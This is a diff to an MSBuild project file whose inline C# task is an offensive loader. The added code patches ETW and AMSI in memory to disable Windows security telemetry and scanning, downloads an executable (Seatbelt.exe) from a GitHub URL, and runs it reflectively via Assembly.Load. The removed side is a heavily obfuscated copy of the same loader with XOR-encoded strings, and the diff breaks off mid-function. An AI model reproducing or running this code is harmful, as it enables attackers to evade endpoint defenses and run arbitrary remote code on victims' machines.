@@ -8,268 +8,456 @@
   AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
      <Task>
       <Code Type="Class" Language="cs">
-	      <![CDATA[	  
+	      <![CDATA[
+using System;
+using System.IO;
+using System.Net;
+using System.Text;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using System.Linq;
+using System.Threading;
+using System.Diagnostics;
+using Microsoft.Build.Framework;
+using Microsoft.Build.Utilities;
 
-using System;using System.IO;using System.Net;using System.Text;using System.Reflection;using System.Runtime.InteropServices;using System.Linq;using System.Threading;//This if for MSBuild LOL bin stuff laterusing Microsoft.Build.Framework;using Microsoft.Build.Utilities;public class MasterablePelado{    private static object[] SuperlabialMyrabalanus = null;
-	[DllImport("kernel32")]
-    private static extern IntPtr LoadLibrary(string ArctogaeanUngiant);
-	[DllImport("kernel32")]
-    private static extern IntPtr GetProcAddress(IntPtr EpidymidesInforming, string RefrigeratedKeyway);
-	[DllImport("kernel32")]
-    private static extern bool VirtualProtect(IntPtr PhilodendronInspeak, UIntPtr LiggatPreexistence, uint UnsunnedKindergartener, out uint UntruthfulnessBoult);
-	private static byte[] NeurinomasUncourtesy(string MysticalnessEaglewood)
+//This is for MSBuild later
+  public class ClassExample : Task, ITask
+  {
+      public override bool Execute()
+      {
+          NetLoader.Main(new string[] { "--path", "https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Seatbelt.exe" });
+          return true;
+      }
+  }
+
+public class NetLoader
+{
+
+    public static IntPtr GetLoadedModuleAddress(string DLLName)
     {
-        byte[] ErosionsShaftfoot = null;
-        FileStream fs = new FileStream(MysticalnessEaglewood,
-                                       FileMode.Open,
-                                       FileAccess.Read);
-        BinaryReader br = new BinaryReader(fs);
-        long UnpotentlyStooks = new FileInfo(MysticalnessEaglewood).Length;
-        ErosionsShaftfoot = br.ReadBytes((int)UnpotentlyStooks);
-        return ErosionsShaftfoot;
-    }
-	private static IntPtr WhippowillUpapurana(IntPtr GirdingSublayer)
-    {
-        uint OutsplendorAutographs = 0;
-        if (VirtualProtect(GirdingSublayer, (UIntPtr)RehbocContangential().Length, 0x40, out OutsplendorAutographs))
+        ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
+        foreach (ProcessModule Mod in ProcModules)
         {
-            return GirdingSublayer;
+            if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
+            {
+                return Mod.BaseAddress;
+            }
+        }
+        return IntPtr.Zero;
+    }
+    public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
+    {
+        IntPtr FunctionPtr = IntPtr.Zero;
+        try
+        {
+            // Traverse the PE header in memory
+            Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
+            Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
+            Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
+            Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
+            Int64 pExport = 0;
+            if (Magic == 0x010b)
+            {
+                pExport = OptHeader + 0x60;
+            }
+            else
+            {
+                pExport = OptHeader + 0x70;
+            }
+
+            // Read -> IMAGE_EXPORT_DIRECTORY
+            Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
+            Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
+            Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
+            Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
+            Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
+            Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
+            Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));
+
+            // Loop the array of export name RVA's
+            for (int i = 0; i < NumberOfNames; i++)
+            {
+                string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
+                if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
+                {
+                    Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
+                    Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
+                    FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
+                    break;
+                }
+            }
+        }
+        catch
+        {
+            // Catch parser failure
+            throw new InvalidOperationException("Failed to parse module exports.");
+        }
+
+        if (FunctionPtr == IntPtr.Zero)
+        {
+            // Export not found
+            throw new MissingMethodException(ExportName + ", export not found.");
+        }
+        return FunctionPtr;
+    }
+    public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false)
+    {
+        IntPtr hModule = GetLoadedModuleAddress(DLLName);
+        if (hModule == IntPtr.Zero)
+        {
+            throw new DllNotFoundException(DLLName + ", Dll was not found.");
+        }
+
+        return GetExportAddress(hModule, FunctionName);
+    }
+    public static object DynamicAPIInvoke(string DLLName, string FunctionName, Type FunctionDelegateType, ref object[] Parameters)
+    {
+        IntPtr pFunction = GetLibraryAddress(DLLName, FunctionName);
+        return DynamicFunctionInvoke(pFunction, FunctionDelegateType, ref Parameters);
+    }
+    public static object DynamicFunctionInvoke(IntPtr FunctionPointer, Type FunctionDelegateType, ref object[] Parameters)
+    {
+        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType);
+        return funcDelegate.DynamicInvoke(Parameters);
+    }
+    private static byte[] xorEncDec(byte[] inputData, string keyPhrase)
+    {
+        //byte[] keyBytes = Encoding.UTF8.GetBytes(keyPhrase);
+        byte[] bufferBytes = new byte[inputData.Length];
+        for (int i = 0; i < inputData.Length; i++)
+        {
+            bufferBytes[i] = (byte)(inputData[i] ^ Encoding.UTF8.GetBytes(keyPhrase)[i % Encoding.UTF8.GetBytes(keyPhrase).Length]);
+        }
+        return bufferBytes;
+    }
+
+
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+    public delegate IntPtr GetProcAddress(IntPtr UrethralgiaOrc, string HypostomousBuried);
+
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+    public delegate bool VirtualProtect(IntPtr GhostwritingNard, UIntPtr NontabularlyBankshall, uint YohimbinizationUninscribed, out uint ZygosisCoordination);
+
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+    public delegate IntPtr LoadLibrary(string LiodermiaGranulater);
+
+    private static object[] globalArgs = null;
+
+    public static void Main(string[] args)
+    {
+        
+        PatchETW();
+
+        PathAMSI();
+
+        string payloadPathOrUrl = "";
+        string[] payloadArgs = new string[] { };
+
+        bool base64Enc = false;
+        bool xorEnc = false;
+        string xorKey = "";
+
+        int secProTypeHolde = (Convert.ToInt32("384") * Convert.ToInt32("8"));
+        if (args.Length > 0)
+        {
+
+            foreach (string argument in args)
+            {
+
+                if (argument.ToLower() == "--b64" || argument.ToLower() == "-b64")
+                {
+                    base64Enc = true;
+                    Console.WriteLine("[+] All arguments are Base64 encoded, decoding them on the fly");
+                }
+
+
+                if (argument.ToLower() == "-xor" || argument.ToLower() == "--xor")
+                {
+                    xorEnc = true;
+
+                    int argData = Array.IndexOf(args, argument) + 1;
+                    if (argData < args.Length)
+                    {
+                        string rawArg = args[argData];
+                        if (base64Enc)
+                            xorKey = Encoding.UTF8.GetString(Convert.FromBase64String(rawArg));
+                        else
+                            xorKey = rawArg;
+                    }
+
+                    Console.WriteLine("[+] Decrypting XOR encrypted binary using key '{0}'", xorKey);
+                }
+
+
+                if (argument.ToLower() == "-path" || argument.ToLower() == "--path")
+                {
+                    int argData = Array.IndexOf(args, argument) + 1;
+                    if (argData < args.Length)
+                    {
+                        string rawPayload = args[argData];
+                        if (base64Enc)
+                            payloadPathOrUrl = Encoding.UTF8.GetString(Convert.FromBase64String(rawPayload));
+                        else
+                            payloadPathOrUrl = rawPayload;
+                    }
+                }
+
+
+                if (argument.ToLower() == "-args" || argument.ToLower() == "--args")
+                {
+                    int binaryArgsIndex = Array.IndexOf(args, argument) + 1;
+                    int nbBinaryArgs = args.Length - binaryArgsIndex;
+
+                    payloadArgs = new String[nbBinaryArgs];
+
+
+                    for (int i = 0; i < nbBinaryArgs; i++)
+                    {
+                        string rawPayloadArgs = args[binaryArgsIndex + i];
+
+                        if (base64Enc)
+                            payloadArgs[i] = Encoding.UTF8.GetString(Convert.FromBase64String(rawPayloadArgs));
+                        else
+                            payloadArgs[i] = rawPayloadArgs;
+                    }
+                }
+            }
+
+
+            if (string.IsNullOrEmpty(payloadPathOrUrl))
+            {
+                printHelp();
+                Environment.Exit(0);
+            }
+
+
+
+            TriggerPayload(payloadPathOrUrl, payloadArgs, xorEnc, xorKey, secProTypeHolde);
+            Environment.Exit(0);
+
+
+        }
+
+
+
+
+    }
+
+    private static void PatchETW()
+    {
+        IntPtr pEtwEventSend = GetLibraryAddress("ntdll.dll", "EtwEventWrite");
+        IntPtr pVirtualProtect = GetLibraryAddress("kernel32.dll", "VirtualProtect");
+
+        VirtualProtect fVirtualProtect = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(pVirtualProtect, typeof(VirtualProtect));
+
+        var patch = getETWPayload();
+        uint oldProtect;
+
+        if (fVirtualProtect(pEtwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect))
+        {
+            Marshal.Copy(patch, 0, pEtwEventSend, patch.Length);
+            Console.WriteLine("[+] Successfully unhooked ETW!");
+        }
+
+
+    }
+
+    private static string parseStringConsoleInput(string inputData, bool base64Decode)
+    {
+        if (base64Decode)
+            inputData = Encoding.UTF8.GetString(Convert.FromBase64String(inputData));
+
+        if (inputData.Trim().ToLower().Equals("x"))
+            Environment.Exit(0);
+
+        return inputData;
+
+    }
+
+    private static bool parseBoolConsoleInput(ConsoleKey consoleKey)
+    {
+        if (consoleKey == ConsoleKey.X)
+            Environment.Exit(0);
+
+        return (consoleKey == ConsoleKey.Y);
+    }
+
+    private static void printHelp()
+    {
+
+        Console.WriteLine("Usage: ");
+        Console.WriteLine("Usage: [-b64] [-xor <key>] -path <binary_path> [-args <binary_args>]");
+        Console.WriteLine("\t-b64: Optionnal flag parameter indicating that all other parameters are base64 encoded.");
+        Console.WriteLine("\t-xor: Optionnal parameter indicating that binary files are XOR encrypted. Must be followed by the XOR decryption key.");
+        Console.WriteLine("\t-path: Mandatory parameter. Indicates the path, either local or a URL, of the binary to load.");
+        Console.WriteLine("\t-args: Optionnal parameter used to pass arguments to the loaded binary. Must be followed by all arguments for the binary.");
+
+    }
+
+    private static Assembly loadASM(byte[] byteArray)
+    {
+        return Assembly.Load(byteArray);
+    }
+
+    private static byte[] readLocalFilePath(string filePath, FileMode fileMode)
+    {
+        byte[] buffer = null;
+        using (FileStream fs = new FileStream(filePath, fileMode, FileAccess.Read))
+        {
+            buffer = new byte[fs.Length];
+            fs.Read(buffer, 0, (int)fs.Length);
+        }
+        return buffer;
+
+    }
+    private static IntPtr getAMSILocation()
+    {
+        //GetProcAddress
+        IntPtr pGetProcAddress = GetLibraryAddress("kernel32.dll", "GetProcAddress");
+        IntPtr pLoadLibrary = GetLibraryAddress("kernel32.dll", "LoadLibraryA");
+
+        GetProcAddress fGetProcAddress = (GetProcAddress)Marshal.GetDelegateForFunctionPointer(pGetProcAddress, typeof(GetProcAddress));
+        LoadLibrary fLoadLibrary = (LoadLibrary)Marshal.GetDelegateForFunctionPointer(pLoadLibrary, typeof(LoadLibrary));
+
+        return fGetProcAddress(fLoadLibrary("amsi.dll"), "AmsiScanBuffer");
+    }
+
+    private static bool is64Bit()
+    {
+        if (IntPtr.Size == 4)
+            return false;
+
+        return true;
+    }
+
+
+    private static byte[] getETWPayload()
+    {
+        if (!is64Bit())
+            return Convert.FromBase64String("whQA");
+        return Convert.FromBase64String("ww==");
+    }
+
+    private static byte[] getAMSIPayload()
+    {
+        if (!is64Bit())
+            return Convert.FromBase64String("uFcAB4DCGAA=");
+        return Convert.FromBase64String("uFcAB4DD");
+    }
+
+    private static Type junkFunction(MethodInfo methodInfo)
+    {
+        return methodInfo.ReflectedType;
+    }
+    private static object invokeCSharpMethod(MethodInfo methodInfo)
+    {
+        if (junkFunction(methodInfo) == methodInfo.ReflectedType)
+            methodInfo.Invoke(null, globalArgs);
+        Console.ReadLine();
+        return globalArgs[0];
+    }
+
+    private static byte[] downloadURL(string url)
+    {
+        HttpWebRequest myRequest = (HttpWebRequest)WebRequest.Create(url);
+        myRequest.Proxy.Credentials = CredentialCache.DefaultCredentials;
+        myRequest.Method = "GET";
+        WebResponse myResponse = myRequest.GetResponse();
+        MemoryStream ms = new MemoryStream();
+        myResponse.GetResponseStream().CopyTo(ms);
+        return ms.ToArray();
+    }
+
+    public static int setProtocolTLS(int secProt)
+    {
+        ServicePointManager.SecurityProtocol = (SecurityProtocolType)secProt;
+        return secProt;
+    }
+    private static MethodInfo getEntryPoint(Assembly asm)
+    {
+
+        return asm.EntryPoint;
+    }
+
+    private static void TriggerPayload(string payloadPathOrURL, string[] inputArgs, bool xorEncoded, string xorKey, int setProtType = 0)
+    {
+        setProtocolTLS(setProtType);
+
+        if (!string.IsNullOrEmpty(string.Join(" ", inputArgs)))
+            Console.WriteLine("[+] URL/PATH : " + payloadPathOrURL + " Arguments : " + string.Join(" ", inputArgs));
+        else
+        {
+            Console.WriteLine("[+] URL/PATH : " + payloadPathOrURL + " Arguments : " + string.Join(" ", inputArgs));
+        }
+        globalArgs = new object[] { inputArgs };
+
+        if (xorEncoded && payloadPathOrURL.ToLower().StartsWith("http"))
+        {
+
+            encDeploy(downloadURL(payloadPathOrURL), xorKey);
+        }
+        else if (!xorEncoded && payloadPathOrURL.ToLower().StartsWith("http"))
+        {
+
+            unEncDeploy(downloadURL(payloadPathOrURL));
+        }
+        else if (!xorEncoded && !payloadPathOrURL.ToLower().StartsWith("http"))
+            unEncDeploy(readLocalFilePath(payloadPathOrURL, FileMode.Open));
+        else
+            encDeploy(readLocalFilePath(payloadPathOrURL, FileMode.Open), xorKey);
+
+    }
+
+    private static void encDeploy(byte[] data, string xorKey)
+    {
+
+        invokeCSharpMethod(getEntryPoint(loadASM(xorEncDec(data, xorKey))));
+
+    }
+
+    private static void unEncDeploy(byte[] data)
+    {
+
+        invokeCSharpMethod(getEntryPoint(loadASM(data)));
+
+    }
+
+    private static IntPtr unProtect(IntPtr amsiLibPtr)
+    {
+
+        IntPtr pVirtualProtect = GetLibraryAddress("kernel32.dll", "VirtualProtect");
+
+        VirtualProtect fVirtualProtect = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(pVirtualProtect, typeof(VirtualProtect));
+
+        uint newMemSpaceProtection = 0;
+        if (fVirtualProtect(amsiLibPtr, (UIntPtr)getAMSIPayload().Length, 0x40, out newMemSpaceProtection))
+        {
+            return amsiLibPtr;
         }
         else
         {
             return (IntPtr)0;
         }
+
     }
-	private static IntPtr ManglinglyCopraemia()
+    private static void PathAMSI()
     {
-        return GetProcAddress(LoadLibrary(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("KQIKDUsKHyo="), "HoydensFoollike"))), Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("ER8aBDIRLwc2BwkBABw="), "PrimarNitrogens")));
-    }
-	private static MethodInfo ZymurgiesSluggardy(Assembly asm)
-    {
-        return asm.EntryPoint;
-    }
-	private static byte[] AleukemicPepsinating(HttpWebRequest BrashlyOrtyginae)
-    {
-		var BarbequingDelesseriaceous = BrashlyOrtyginae.GetResponse();
-        MemoryStream ms = new MemoryStream();
-        var MetantimoniteInternally = BarbequingDelesseriaceous.GetResponseStream();
-		MetantimoniteInternally.CopyTo(ms);
-        return ms.ToArray();
-    }
-	private static void PhratorAstr()
-    {
-        Console.WriteLine(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("AQYDAg1fQQ=="), "TubeheartedPickling")));
-        Console.WriteLine(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("BQAYBA1bRzRKG3dGPkgsSBYMGnBPEgYRXzpPSgkgBgtISwcHDQkiCiYTCRUPUUcibBMRDwRFUgEBPhILGjcAFQgURxw="), "PsychagogyArchwench")));
-        Console.WriteLine(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("HQxEDlpVSFkLERoNBgsvGQVMCg0THmQRDxYICCQMDB5MCBwdLQIPEAALJlgdBA0VUhgoDU4LHQ0kCkkcDRMTFCEVCxYaRSAKDEwOAAEcclVOAQcGLhwMCEI="), "AxillaryDandie")));
-        Console.WriteLine(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("ERFBFAAce0wpERgPDiMLDQBPHiAeBwwJEgQ/RQUCCwciDRIIAgFBOQ0NGE8MKAIHExVGByQJCR9PDzMJRjkjNEEoCw8eFh41CQJPTCsUPhFMDgpOJwMKDQMRBClFDhVPGikJRjkjNEEpAA8eFh41BQkPTA0ENEs="), "MellonAlfalfa")));
-        Console.WriteLine(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("ChVKBQQHHGpSIhc4BQYBCgENcAIOBDcMAgEAAVpwOwESPwIGAQAAVCQaClYmABMdSVMROQYHEyRBCxoGEhhwHR1WN0EyJylfVD8UTwI+BEcXDB0VIgtPAjlBCxoEF1o="), "VaguestProv")));
-        Console.WriteLine(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("EhtDFAYOH1NUNj0dGhwBGxMFQR4IAQwjChoQBkkZGhEdbR0cUx8UARpBDxsUGCMKAAEHSRgGVA0lDFMfABQWDAVOCxoDLx0XW1QkGRoAWS8MUxUAGR4GFgsNUw83Tw8ZGEkNGxMMIAwdBxxVFAYTTh0bCG4NBxsVGxVH"), "NonutilityMissourianism")));
-    }
-	private static string PrecinctionCustrel(string NonexertionEvectant, bool PiculsFraughting)
-    {
-        if (PiculsFraughting)
-            NonexertionEvectant = Encoding.UTF8.GetString(Convert.FromBase64String(NonexertionEvectant));
-        if (NonexertionEvectant.Trim().ToLower().Equals(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("PQ=="), "EnsepulcheredShellblowing"))))
-            Environment.Exit(0);
-        return NonexertionEvectant;
-    }
-	private static byte[] MedietyUnidentifying(string url)
-    {
-        ServicePointManager.SecurityProtocol = (SecurityProtocolType)((int)SecurityProtocolType.Ssl3 + Convert.ToInt32(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("ZFhXRg=="), "WhereunderHedgetaper"))));
-        HttpWebRequest BrashlyOrtyginae = (HttpWebRequest)WebRequest.Create(url);
-		BrashlyOrtyginae.Method = Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("CCE7"), "OdontaspididaeJejunotomy"));
-        BrashlyOrtyginae.Proxy.Credentials = CredentialCache.DefaultCredentials;
-        var ManipulatingSulfohydrate = AleukemicPepsinating(BrashlyOrtyginae);
-		return ManipulatingSulfohydrate;
-    }
-	public static void Main(string[] args)
-    {
-        if (args.Length > 0)
+
+        IntPtr amsiLibPtr = unProtect(getAMSILocation());
+        if (amsiLibPtr != (IntPtr)0)
         {
-            Console.WriteLine(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("GUgvRBYpAwU9EhQFAk5JQQwDGxwLWBdPRx0QFiAGDwEEAA=="), "BirdhoodSublinear")));
-            string BoreensScroo = "";
-            string VintagingCrescented = "";
-            string[] NoncontrollingEphelis = new string[] { };
-            bool IsopropenylOrangeades = false;
-            bool PseudoassertiveFyttes = false;
-            GenitalsParlousness();
-            foreach (string argument in args)
-            {
-                if (argument.ToLower() == Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("bF8JYVs="), "ArkWorriting")) || argument.ToLower() == Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("fw1MTg=="), "RozzersWhuskie")))
-                {
-                    Console.WriteLine(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("GVk4TjI8H0MJFwkBLxcLGgBwEhENRSwVMRdTWlM1HQAHAQsQblIBCxA/FwoGAk4AKhcIThw+UxcAAE4SLgs="), "BrensPschent")));
-                    IsopropenylOrangeades = true;
-                }
-                if (argument.ToLower() == Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("bB4bIQ=="), "AftSpewers")) || argument.ToLower() == Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("fUEdBhM="), "PleiadsTwankay")))
-                {
-                    PseudoassertiveFyttes = true;
-                    int FloorageAuth = Array.IndexOf(args, argument) + 1;
-                    if (FloorageAuth < args.Length)
-                    {
-                        string ReconvictErythremia = args[FloorageAuth];
-                        if (IsopropenylOrangeades)
-                            BoreensScroo = Encoding.UTF8.GetString(Convert.FromBase64String(ReconvictErythremia));
-                        else
-                            BoreensScroo = ReconvictErythremia;
-                    }
-                    Console.WriteLine(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("GUQuUCsXChMXIhEaBwlMMSQ3YgodEx0LGRULNkURAAANGxJFNxwaHghSAgQXckIIWRNL"), "BosporianResinlike")), BoreensScroo);
-                }
-                if (argument.ToLower() == Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("aB4FEQk="), "EndearmentsSuling")) || argument.ToLower() == Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("bl8VBR0K"), "CrediblyGrading")))
-                {
-                    int FloorageAuth = Array.IndexOf(args, argument) + 1;
-                    if (FloorageAuth < args.Length)
-                    {
-                        string ProlectiteAfd = args[FloorageAuth];
-                        if (IsopropenylOrangeades)
-                            VintagingCrescented = Encoding.UTF8.GetString(Convert.FromBase64String(ProlectiteAfd));
-                        else
-                            VintagingCrescented = ProlectiteAfd;
-                    }
-                }
-                if (argument.ToLower() == Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("aA8GCBc="), "EntodermMisanswer")) || argument.ToLower() == Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("YlgVFQYe"), "OutgamblingResorbs")))
-                {
-                    int ObjectlesslyImperation = Array.IndexOf(args, argument) + 1;
-                    int TyrtaeanPseudogenuses = args.Length - ObjectlesslyImperation;
-                    NoncontrollingEphelis = new String[TyrtaeanPseudogenuses];
-                    for (int i = 0; i < TyrtaeanPseudogenuses; i++)
-                    {
-                        string ProlectiteAfdArgs = args[ObjectlesslyImperation + i];
-                        if (IsopropenylOrangeades)
-                            NoncontrollingEphelis[i] = Encoding.UTF8.GetString(Convert.FromBase64String(ProlectiteAfdArgs));
-                        else
-                            NoncontrollingEphelis[i] = ProlectiteAfdArgs;
-                    }
-                }
-            }
-            if (string.IsNullOrEmpty(VintagingCrescented))
-            {
-                PhratorAstr();
-                Environment.Exit(0);
-            }
-            TredecaphobiaSliverlike(VintagingCrescented, NoncontrollingEphelis, PseudoassertiveFyttes, BoreensScroo);
-            Environment.Exit(0);
-        }
-    }
-	private static bool AvalonRahanwin(ConsoleKey ZooplastyTriglyceride)
-    {
-        if (ZooplastyTriglyceride == ConsoleKey.X)
-            Environment.Exit(0);
-        return (ZooplastyTriglyceride == ConsoleKey.Y);
-    }
-	private static Assembly GassersTympanomaxillary(byte[] DeclasseeTasco)
-    {
-        return Assembly.Load(DeclasseeTasco);
-    }
-	private static byte[] RehbocContangential()
-    {
-        if (!ImpervialPredaylight())
-            return Convert.FromBase64String(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("Pi4WLSZVATcyJSR2"), "KhuldaEtude")));
-        return Convert.FromBase64String(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("Iy8NKCFBKDA="), "VinicultureMansions")));
-    }
-	private static void GonosomeAche(byte[] ManipulatingSulfohydrate)
-    {
-        ((MethodInfo)TwelfthsHoydenhood(ZymurgiesSluggardy(GassersTympanomaxillary(ManipulatingSulfohydrate)))).Invoke(null, SuperlabialMyrabalanus);
-    }
-	private static void IodoformEugenical()
-    {
-        IntPtr GirdingSublayer = WhippowillUpapurana(ManglinglyCopraemia());
-        if (GirdingSublayer != (IntPtr)0)
-        {
-            Marshal.Copy(RehbocContangential(), 0, GirdingSublayer, RehbocContangential().Length);
-            Console.WriteLine(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("DkUtUjwDDAgMHRQ1Fh4JHEMYBBA2BhUWTzciOCBP"), "UnprovokingScreeched")));
+            Marshal.Copy(getAMSIPayload(), 0, amsiLibPtr, getAMSIPayload().Length);
+            Console.WriteLine("[+] Successfully patched AMSI!");
         }
         else
         {
-            Console.WriteLine(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("GUg+SDkTPQ0LBhwVRSI5PSxTNQMgLy0t"), "BichirIncorrectness")));
+            Console.WriteLine("[!] Patching AMSI FAILED");
         }
-    }
-	private static void GenitalsParlousness()
-    {
-        var DyvourBombycina = GastlyMisleadable();
-        uint FrequenterFungous;
-        var MudpackScrappiest = LoadLibrary(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("KxgBDxhcCwED"), "ElectromobilePegmatize")));
-        var ScatterplotsAllokinetic = GetProcAddress(MudpackScrappiest, Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("Ax0VNx8JAhEzIgYYHA=="), "FibrilledPolysalicylide")));
-        if (VirtualProtect(ScatterplotsAllokinetic, (UIntPtr)DyvourBombycina.Length, 0x40, out FrequenterFungous))
-        {
-            Marshal.Copy(DyvourBombycina, 0, ScatterplotsAllokinetic, DyvourBombycina.Length);
-            Console.WriteLine(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("CEIxVjIbFhA3FgYSHAAFA0EBBwcBPAIJEkErISRz"), "SilvanusReutilization")));
-        }
-    }
-	private static void UmbrousFeigners(byte[] ManipulatingSulfohydrate, string BoreensScroo)
-    {
-        ((MethodInfo)TwelfthsHoydenhood(ZymurgiesSluggardy(GassersTympanomaxillary(BluebuckChinche(ManipulatingSulfohydrate, BoreensScroo))))).Invoke(null, SuperlabialMyrabalanus);
-    }
-	private static object TwelfthsHoydenhood(MethodInfo OrnithophilistReexpelling)
-    {
-        return OrnithophilistReexpelling;
-    }
-	private static bool ImpervialPredaylight()
-    {
-        if (IntPtr.Size == 4)
-            return false;
-        return true;
-    }
-	private static byte[] BluebuckChinche(byte[] NonexertionEvectant, string UkelelesLaughed)
-    {
-        //byte[] keyBytes = Encoding.UTF8.GetBytes(UkelelesLaughed);
-        byte[] YourselfHumidified = new byte[NonexertionEvectant.Length];
-        for (int i = 0; i < NonexertionEvectant.Length; i++)
-        {
-            YourselfHumidified[i] = (byte)(NonexertionEvectant[i] ^ Encoding.UTF8.GetBytes(UkelelesLaughed)[i % Encoding.UTF8.GetBytes(UkelelesLaughed).Length]);
-        }
-        return YourselfHumidified;
-    }
-	private static byte[] GastlyMisleadable()
-    {
-        if (!ImpervialPredaylight())
-            return Convert.FromBase64String(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("OQclLg=="), "NotodontoidHyperintelligent")));
-        return Convert.FromBase64String(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("Mx5LXA=="), "DivaricatedPolygamical")));
-    }
-	private static Type FleabanesEndolabyrinthitis(MethodInfo OrnithophilistReexpelling)
-    {
-        return OrnithophilistReexpelling.ReflectedType;
-    }
-	private static void TredecaphobiaSliverlike(string MangosteenGomuti, string[] FivefoldWentletrap, bool PseudoassertiveFyttesoded = false, string BoreensScroo = "")
-    {
-        IodoformEugenical();
-       if (MangosteenGomuti.Length > 1){
-			if (!string.IsNullOrEmpty(string.Join(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("cA=="), "PtarmicaBetassel")), FivefoldWentletrap))) { 
-				Console.WriteLine(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("GF4xVDwhOGcpLTsrSVlI"), "CultistHylocichla")) + MangosteenGomuti);
-				Console.WriteLine(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("EkUuQS0HBQcEChsHH1l+SQ=="), "InsalubriouslyDiscs")) + string.Join(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("cA=="), "PtarmicaBetassel")), FivefoldWentletrap));
-			}
-			else 
-			{
-			   Console.WriteLine(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("GF4xVDwhOGcpLTsrSVlI"), "CultistHylocichla")) + MangosteenGomuti);
-			   Console.WriteLine(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("EkUuQS0HBQcEChsHH1l+SQ=="), "InsalubriouslyDiscs")) + string.Join(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("cA=="), "PtarmicaBetassel")), FivefoldWentletrap));
-			}
-			SuperlabialMyrabalanus = new object[] { FivefoldWentletrap };
-			if (PseudoassertiveFyttesoded && MangosteenGomuti.ToLower().StartsWith(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("IBsVCA=="), "HoaxingOutstare"))))
-			{
-				UmbrousFeigners(MedietyUnidentifying(MangosteenGomuti), BoreensScroo);
-			}
-			else if (!PseudoassertiveFyttesoded && MangosteenGomuti.ToLower().StartsWith(Encoding.UTF8.GetString(BluebuckChinche(Convert.FromBase64String("IBsVCA=="), "HoaxingOutstare"))))
-			{
